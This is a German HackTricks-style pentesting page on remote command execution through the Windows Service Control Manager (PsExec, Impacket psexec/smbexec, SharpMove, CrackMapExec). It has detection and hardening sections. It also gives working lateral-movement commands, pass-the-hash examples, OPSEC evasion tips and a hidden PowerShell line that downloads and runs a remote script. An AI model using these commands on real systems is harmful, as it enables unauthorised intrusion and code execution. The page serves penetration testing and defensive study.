# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Funktionsweise

Diese Techniken missbrauchen den Windows Service Control Manager (SCM) remote über SMB/RPC, um Befehle auf einem Zielhost auszuführen. Das Service Control Manager Remote Protocol (SCMR) ist die RPC-basierte Schnittstelle zum Konfigurieren und Steuern von Windows-Diensten auf einem Remotecomputer. Mit ausreichenden Berechtigungen kann ein Operator einen Dienst erstellen oder neu konfigurieren, dessen Binärpfad einen Befehl enthält, und den Dienst anschließend starten, um ihn remote auszuführen.<sup>[[5]](#references)</sup> Der typische Ablauf ist:

1. Authentifizierung am Ziel über SMB/RPC (TCP/445); Zugriff auf die Freigabe ADMIN$, wenn die gewählte Variante dort eine Datei ablegen oder Ausgaben abrufen muss.
2. Eine ausführbare Datei kopieren oder eine LOLBAS-Befehlszeile angeben, die der Dienst ausführen soll.
3. Über SCM (MS-SCMR über \PIPE\svcctl) remote einen Dienst erstellen, der auf diesen Befehl oder diese Binärdatei verweist.
4. Den Dienst starten, um die Payload auszuführen, und optional stdin/stdout über eine Named Pipe erfassen.
5. Den Dienst stoppen und aufräumen (den Dienst und alle abgelegten Binärdateien löschen).

Anforderungen/Voraussetzungen:
- Lokaler Administrator auf dem Ziel (SeCreateServicePrivilege) oder explizite Berechtigungen zum Erstellen von Diensten auf dem Ziel.
- SMB (445) ist erreichbar und Remote Service Management ist durch die Host-Firewall erlaubt; ADMIN$ muss für Varianten verfügbar sein, die dort eine Datei ablegen oder Ausgaben abrufen.
- UAC Remote Restrictions: Bei lokalen Konten kann die Tokenfilterung Administratorzugriffe über das Netzwerk blockieren, sofern nicht das integrierte Administratorkonto oder LocalAccountTokenFilterPolicy=1 verwendet wird.
- Kerberos vs. NTLM: Die Verwendung eines Hostnamens/FQDN ermöglicht Kerberos; bei einer Verbindung über die IP-Adresse wird oft auf NTLM zurückgegriffen (was in gehärteten Umgebungen blockiert sein kann).

Wenn kein Dienstkonto angegeben ist, verwendet `CreateService` `LocalSystem`, das über umfangreiche lokale Berechtigungen verfügt. Das erklärt die großen Auswirkungen einer erfolgreichen SCM-Ausführung. Dadurch werden UAC oder Microsoft Defender nicht automatisch deaktiviert: Der Aufrufer benötigt weiterhin Remote-SCM-Berechtigungen, und Endpoint-Sicherheitskontrollen können den Dienst oder die Payload überprüfen oder blockieren.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Manuelles ScExec/WinExec über sc.exe

Das folgende Beispiel zeigt eine minimale Methode zum Erstellen eines Dienstes. Das Dienstabbild kann eine abgelegte EXE oder eine LOLBAS-Datei wie cmd.exe oder powershell.exe sein.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Hinweise:
- Rechne beim Starten einer EXE-Datei ohne Dienst mit einem Timeout-Fehler; die Ausführung findet trotzdem statt.
- Um OPSEC-freundlicher zu bleiben, bevorzuge dateilose Befehle (cmd /c, powershell -enc) oder lösche abgelegte Artefakte.

Ausführlichere Schritte findest du unter: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tools und Beispiele

### Sysinternals PsExec.exe

- Klassisches Admin-Tool, das SMB verwendet, um PSEXESVC.exe in ADMIN$ abzulegen, einen temporären Dienst zu installieren (Standardname PSEXESVC) und die Ein-/Ausgabe über Named Pipes weiterzuleiten.
- Beispielanwendungen:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Du kannst direkt über WebDAV von Sysinternals Live aus starten:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Hinterlässt Ereignisse zur Installation/Deinstallation des Dienstes (Dienstname oft PSEXESVC, sofern -r nicht verwendet wird) und erstellt während der Ausführung C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-like)

- Verwendet einen eingebetteten RemCom-ähnlichen Dienst. Legt über ADMIN$ eine kurzlebige Dienst-Binärdatei ab (häufig mit einem zufälligen Namen), erstellt einen Dienst (standardmäßig oft RemComSvc) und leitet die Ein-/Ausgabe über eine Named Pipe weiter.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Unter Kali befinden sich die Impacket-Beispiele möglicherweise unter `/usr/share/doc/python3-impacket/examples/`. Wenn kein Passwort angegeben wird, fordert das Tool zur Eingabe auf. Impackets `-k` fordert Kerberos-Authentifizierung anstelle von NTLM an und verwendet dabei in der Regel den aktuellen Credential-Cache oder bereitgestellte Zugangsdaten.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefakte
- Temporäre EXE in C:\Windows\ (zufällige 8 Zeichen). Der Dienstname lautet standardmäßig RemComSvc, sofern er nicht überschrieben wird.

### Impacket smbexec.py (SMBExec)

- Erstellt einen temporären Dienst, der cmd.exe startet und für die I/O eine Named Pipe verwendet. Vermeidet in der Regel das Ablegen eines vollständigen EXE-Payloads; die Befehlsausführung ist semi-interaktiv.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementiert mehrere Methoden für laterale Bewegung, einschließlich service-based exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) unterstützt authentifizierte Remote-Ausführung über SCM und mehrere andere Windows-Mechanismen, darunter das Ändern und Erstellen von Diensten.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Du kannst auch CrackMapExec verwenden, um Befehle über verschiedene Backends (psexec/smbexec/wmiexec) auszuführen:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec mit SharpMove

Die SCM-Aktion erstellt einen Dienst namens `WindowsDebug` und verweist auf eine Payload, die bereits auf dem Remote-Host vorhanden ist.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, Erkennung und Artefakte

Typische Host-/Netzwerk-Artefakte bei der Verwendung von PsExec-ähnlichen Techniken:
- Security 4624 (Logon Type 3) und 4672 (Special Privileges) auf dem Ziel für das verwendete Administratorkonto.
- Security 5140/5145 File Share- und File Share Detailed-Ereignisse, die den Zugriff auf ADMIN$ sowie das Erstellen/Schreiben von Dienst-Binärdateien zeigen (z. B. PSEXESVC.exe oder eine zufällige 8-stellige .exe).
- **System** 7045 vom Service Control Manager für die Dienstinstallation auf dem Ziel: Namen wie PSEXESVC, RemComSvc oder benutzerdefinierte Namen (`-r` / `-service-name`). Dies belegt, dass ein Dienst installiert wurde, nicht, dass sein Image ausgeführt wurde. Gleiche den Zeitstempel und den Image-Pfad mit Prozesserignissen oder einem passenden Service-Image-Prefetch-Eintrag ab, sofern verfügbar.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) für services.exe oder das Dienst-Image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) für Pipes wie \\.\pipe\psexesvc, \\.\pipe\remcom_* oder randomisierte Entsprechungen.
- Registry-Artefakt für die Sysinternals-EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 auf dem Operator-Host (falls nicht unterdrückt).

Ideen für die Suche
- Erstelle einen Alert für Dienstinstallationen, bei denen der ImagePath cmd.exe /c, powershell.exe oder TEMP-Verzeichnisse enthält.
- Suche nach Prozesserstellungen, bei denen ParentImage C:\Windows\PSEXESVC.exe ist, oder nach Prozessen unter services.exe, die als LOCAL SYSTEM Shells ausführen.
- Markiere benannte Pipes, die mit -stdin/-stdout/-stderr enden, oder bekannte Pipe-Namen von PsExec-Klonen.

## Fehlerbehebung bei häufigen Problemen
- Access is denied (5) beim Erstellen von Diensten: tatsächlich kein lokaler Administrator, UAC-Remoteeinschränkungen für lokale Konten oder EDR-Manipulationsschutz für den Dienst-Binärdateipfad.
- The network path was not found (53) oder keine Verbindung zu ADMIN$: Firewall blockiert SMB/RPC oder Admin-Freigaben sind deaktiviert.
- Kerberos schlägt fehl, aber NTLM ist blockiert: Stelle eine Verbindung über den Hostnamen/FQDN (nicht die IP) her, stelle sicher, dass die SPNs korrekt sind, oder verwende bei Impacket `-k`/`-no-pass` mit Tickets.
- Der Dienststart läuft in einen Timeout, aber die Payload wurde ausgeführt: Das ist zu erwarten, wenn es sich nicht um eine echte Dienst-Binärdatei handelt; leite die Ausgabe in eine Datei um oder verwende smbexec für Live-I/O.

## Hinweise zur Härtung
- Windows 11 24H2 und Windows Server 2025 erfordern standardmäßig SMB signing für ausgehende (und bei Windows 11 auch eingehende) Verbindungen. Dies verhindert nicht die legitime Verwendung von PsExec mit gültigen Zugangsdaten, unterbindet aber den Missbrauch von SMB relay ohne Signierung und kann Geräte betreffen, die Signierung nicht unterstützen.<sup>[[2]](#references)</sup>
- Die neue NTLM-Blockierung des SMB-Clients (Windows 11 24H2/Server 2025) kann den NTLM-Fallback verhindern, wenn eine Verbindung über eine IP-Adresse oder zu Servern ohne Kerberos hergestellt wird. In gehärteten Umgebungen wird dadurch NTLM-basiertes PsExec/SMBExec nicht funktionieren; verwende Kerberos (Hostname/FQDN) oder konfiguriere bei legitimer Notwendigkeit Ausnahmen.<sup>[[2]](#references)</sup>
- Prinzip der geringsten Rechte: Begrenze die Mitgliedschaft in der lokalen Administratorengruppe, bevorzuge Just-in-Time/Just-Enough Admin, setze LAPS durch und überwache/erstelle Alerts für Dienstinstallationen mit Ereignis 7045.

## Siehe auch

- WMI-basierte Remote-Ausführung (oft stärker dateilos):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-basierte Remote-Ausführung:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec – Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB-Sicherheitshärtung in Windows Server 2025 und Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Zugangsdaten verwenden, um Windows-Systeme zu übernehmen – Teil 2 (PSExec und Dienste)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Unerwartete Neustarts mithilfe von Systemereignisprotokollen beheben](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications – Übersicht über das Remote Protocol des Service Control Managers](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub – SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn – LocalSystem-Konto](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn – Funktion `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
